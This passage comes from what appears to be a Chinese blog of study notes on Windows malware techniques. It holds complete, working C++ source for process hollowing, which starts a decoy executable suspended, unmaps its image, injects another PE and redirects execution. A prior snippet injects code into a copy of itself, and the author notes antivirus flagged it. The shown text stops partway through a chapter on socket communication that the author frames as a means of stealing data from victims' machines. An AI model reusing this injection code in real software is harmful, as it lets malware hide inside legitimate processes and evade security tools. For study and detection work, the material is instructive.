class="line">GetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line">ctx.Eip = (DWORD)ptr;</span><br><span class="line"></span><br><span class="line">SetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">ResumeThread(pi.hThread);</span><br><span class="line">WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line">CloseHandle(pi.hProcess);</span><br><span class="line">CloseHandle(pi.hThread);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CHAR Filename[MAX_PATH];</span><br><span class="line">PVOID ptr= TRUEProc;</span><br><span class="line">GetModuleFileNameA(<span class="number">0</span>, Filename, MAX_PATH);</span><br><span class="line">CreateMyself(Filename, ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好家伙，运行直接被火绒杀了，火绒有点凶。<br><img src="https://s2.loli.net/2022/01/22/PTg9ZLQakbmGhCN.png"></p><h3 id="傀儡进程-pe映像切换技术"><a href="#傀儡进程-pe映像切换技术" class="headerlink" title="傀儡进程-pe映像切换技术"></a>傀儡进程-pe映像切换技术</h3><p>这个技术我之前也写过文章介绍过，但是没去自己实现下代码，现在来亲自实现下，包括安洵的出题都是用的现成的。</p><p>CreateProcess函数创建一个进程前会把该进程映射到虚拟内存中，但是如果我们以挂起模式创建，然后把映射的程序改为另一个程序的映射，就可以达到运行另一个程序的目的了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ReadNewExeFile</span><span class="params">(CHAR* szNewFilePath,BYTE ** buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwFileSize = <span class="number">0</span>;</span><br><span class="line">DWORD dwNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">HANDLE hFile;</span><br><span class="line"></span><br><span class="line">hFile = CreateFileA(szNewFilePath, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateFileA Failed !!! GetLastError: %d&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line">*buffer = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ReadFile(hFile, *buffer, dwFileSize, &amp;dwNumberOfBytesRead, <span class="literal">NULL</span>) == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed !!! GetLastError: %d&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CheckImageBaseIsSame</span><span class="params">(PROCESS_INFORMATION pi, PBYTE pbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//定义ZwUnmapViewOfSection函数所需要的东西</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PFZWUNMAPVIEWOFSECTION)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HANDLE      ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">PVOID       BaseAddress</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_SUCCESS(0x00000000L) </span></span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER       pIDH = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER  pIOH = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwRealImageBase = <span class="number">0</span>;</span><br><span class="line">DWORD dwFakeImageBase = <span class="number">0</span>;</span><br><span class="line">CONTEXT ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">FARPROC pFunc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//先获取real.exe的image base</span></span><br><span class="line">pIDH = (PIMAGE_DOS_HEADER)pbuf;</span><br><span class="line">pIOH = (PIMAGE_OPTIONAL_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">dwRealImageBase = pIOH-&gt;ImageBase;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取线程上下文</span></span><br><span class="line">ctx.ContextFlags = CONTEXT_FULL;</span><br><span class="line"><span class="keyword">if</span> (!GetThreadContext(pi.hThread, &amp;ctx))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetThreadContext() failed! %d\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取fake.exe的image base</span></span><br><span class="line"><span class="keyword">if</span> (!ReadProcessMemory(</span><br><span class="line">pi.hProcess,</span><br><span class="line">(LPCVOID)(ctx.Ebx + <span class="number">8</span>),     <span class="comment">// ctx.Ebx = PEB, ctx.Ebx + 8 = PEB.ImageBase</span></span><br><span class="line">&amp;dwFakeImageBase,</span><br><span class="line"><span class="keyword">sizeof</span>(DWORD),</span><br><span class="line"><span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ReadProcessMemory() failed! %d\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwFakeImageBase == dwRealImageBase)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//相等则调用ZwUnmapViewOfSection的函数将Fake.exe的PE映像从虚拟内存删除</span></span><br><span class="line">pFunc = GetProcAddress(GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwUnmapViewOfSection&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (STATUS_SUCCESS != ((PFZWUNMAPVIEWOFSECTION)pFunc)(pi.hProcess, (PVOID)dwFakeImageBase))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ZwUnmapViewOfSection() failed!!! %d\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//不相等则直接将Fake.exe的ImageBase换为Real.exe的</span></span><br><span class="line"><span class="keyword">if</span> (!WriteProcessMemory(</span><br><span class="line">pi.hProcess,</span><br><span class="line">(LPVOID)(ctx.Ebx + <span class="number">8</span>),     <span class="comment">// ctx.Ebx = PEB, ctx.Ebx + 8 = PEB.ImageBase</span></span><br><span class="line">&amp;dwRealImageBase,</span><br><span class="line"><span class="keyword">sizeof</span>(DWORD),</span><br><span class="line"><span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory() failed! %d\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ImageWrite</span><span class="params">(PROCESS_INFORMATION pi,PBYTE pbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)pbuf;</span><br><span class="line">PIMAGE_FILE_HEADER      pIFH = (PIMAGE_FILE_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">4</span>);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">PIMAGE_SECTION_HEADER   pISH = (PIMAGE_SECTION_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line">DWORD dImageSize=<span class="number">0</span>;</span><br><span class="line">DWORD dSectionNum=<span class="number">0</span>;</span><br><span class="line">LPVOID BaseAddress=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">dImageSize = pIOH-&gt;SizeOfImage;</span><br><span class="line">dSectionNum = pIFH-&gt;NumberOfSections;</span><br><span class="line"></span><br><span class="line"><span class="comment">//申请real.exe的ImageBase大小的空间，注意不是文件大小</span></span><br><span class="line">BaseAddress = VirtualAllocEx(pi.hProcess, (LPVOID)pIOH-&gt;ImageBase, dImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (BaseAddress == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx Failed !!! %d&quot;</span>,GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写入头，头的映射无论是在内存还是在文件都是一样的。</span></span><br><span class="line"><span class="keyword">if</span> (WriteProcessMemory(pi.hProcess, BaseAddress, pbuf, pIOH-&gt;SizeOfHeaders, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Failed !!! %d&quot;</span>,GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//for循环写每个节区，BaseAddress + pISH-&gt;VirtualAddress代表每个节区在内存中的位置，pbuf + pISH-&gt;PointerToRawData代表在文件中的位置</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; dSectionNum;i++, pISH++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)BaseAddress + pISH-&gt;VirtualAddress), pbuf + pISH-&gt;PointerToRawData, pISH-&gt;SizeOfRawData, <span class="literal">NULL</span>)==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Failed !!!  %d&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">ReplaceProcess</span><span class="params">(CHAR* szFakeFilePath,CHAR* szNewFilePath, PBYTE pbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">STARTUPINFOA si;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line">CHAR szFilename[MAX_PATH];</span><br><span class="line">ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));<span class="comment">//用来将指定的内存块清零。</span></span><br><span class="line">ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">CONTEXT ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)pbuf;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CreateProcessA(szFakeFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断ImageBase是否重叠，第一个参数为什么是传pi的地址，是因为我们要修改pi</span></span><br><span class="line">CheckImageBaseIsSame(pi, pbuf);</span><br><span class="line">ImageWrite(pi,pbuf);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取上下文</span></span><br><span class="line">ctx.ContextFlags = CONTEXT_FULL;</span><br><span class="line"><span class="keyword">if</span> (!GetThreadContext(pi.hThread, &amp;ctx))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetThreadContext() failed! %d\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改为real.exe的EP</span></span><br><span class="line">ctx.Eax = pIOH-&gt;AddressOfEntryPoint + pIOH-&gt;ImageBase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line">ResumeThread(pi.hThread);</span><br><span class="line">WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pbuf !=  <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">free</span>(pbuf);</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(pi.hProcess);</span><br><span class="line">CloseHandle(pi.hThread);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CHAR szNewExePath[MAX_PATH]=<span class="string">&quot;D:\\xor.exe&quot;</span>;</span><br><span class="line">CHAR szFakeExePath[MAX_PATH] = <span class="string">&quot;D:\\fake.exe&quot;</span>;</span><br><span class="line">PBYTE buf;</span><br><span class="line"></span><br><span class="line">ReadNewExeFile(szNewExePath, &amp;buf);</span><br><span class="line">ReplaceProcess(szFakeExePath,szNewExePath, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>real.exe是个弹窗，我们运行下可以看到。<br><img src="https://s2.loli.net/2022/01/25/QFX5ubOrZE9dvTx.png"></p><h2 id="第十章-传输技术"><a href="#第十章-传输技术" class="headerlink" title="第十章-传输技术"></a>第十章-传输技术</h2><p>主要是网络通信相关的知识点，因为想要窃取别人电脑的信息，肯定需要网络来通信，将别人电脑的信息发送到自己电脑上。</p><h3 id="Socket-TCP"><a href="#Socket-TCP" class="headerlink" title="Socket-TCP"></a>Socket-TCP</h3><p>TCP通信是需要服务端和客户端的。主要是字节流传输数据。TCP是基于链接的，每条TCP链接只能是点到点的关系。只能是一个ip一个端口。</p><p>服务端，主要的流程是WSAStartup 进行初始化–&gt; socket 创建套接字–&gt; bind 绑定–&gt; listen 监听–&gt;accept 接收请求–&gt; send/recv 发送或接收数据，设计到很多函数，官方文档查就是了。</p><p>代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务端套接字</span></span><br><span class="line">SOCKET ServerSkt;</span><br><span class="line"><span class="comment">// 客户端套接字</span></span><br><span class="line">SOCKET ClientSkt;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc_recv</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接受连接请求</span></span><br><span class="line">sockaddr_in addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> addr_len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">ClientSkt = accept((SOCKET)lpParam, (sockaddr*)(&amp;addr), &amp;addr_len);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accept success\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> message[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//接收信息</span></span><br><span class="line"><span class="keyword">int</span> out = <span class="number">0</span>;</span><br><span class="line">out = recv(ClientSkt, message, MAX_PATH, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (out &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">message[out] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;recv from client:%s\n&quot;</span>, message);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyServer</span><span class="params">(LPCSTR sIP, <span class="keyword">int</span> Port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//WSAStartup初始化</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WSAStartup Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//socket 创建套接字</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ServerSkt = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (ServerSkt == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//配置服务器信息</span></span><br><span class="line">sockaddr_in server_addr;</span><br><span class="line"></span><br><span class="line">server_addr.sin_family = AF_INET;</span><br><span class="line">server_addr.sin_port = htons(Port);</span><br><span class="line">server_addr.sin_addr.S_un.S_addr = inet_addr(sIP);</span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定服务器</span></span><br><span class="line"><span class="keyword">if</span> (bind(ServerSkt, (<span class="keyword">const</span> sockaddr*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//监听</span></span><br><span class="line"><span class="keyword">if</span> (listen(ServerSkt, <span class="number">10</span>) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;listen Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建线程来接收客户端的消息</span></span><br><span class="line">CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)ThreadProc_recv, (LPVOID)ServerSkt, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPCSTR mysIP = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> myPort = <span class="number">12345</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> == MyServer(mysIP, myPort))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Build_Server Failed!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Build_Server success!!!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buffer[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//发送信息</span></span><br><span class="line">gets_s(buffer, <span class="number">20</span>);</span><br><span class="line">send(ClientSkt, buffer, (<span class="number">1</span> + <span class="built_in">strlen</span>(buffer)), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端在运行后就会处于等待连接状态，也就是停在accept的位置，等待客户端进行连接，连接成功后就可以发送和接收信息了，这时我们可以用netstat -an命令去看端口信息。<br><img src="https://s2.loli.net/2022/01/14/rYjCNUv12Gw5lhm.png"></p><p>客户端，主要的流程是WSAStartup 进行初始化–&gt; socket 创建套接字–&gt;connect 连接到服务端–&gt; send/recv 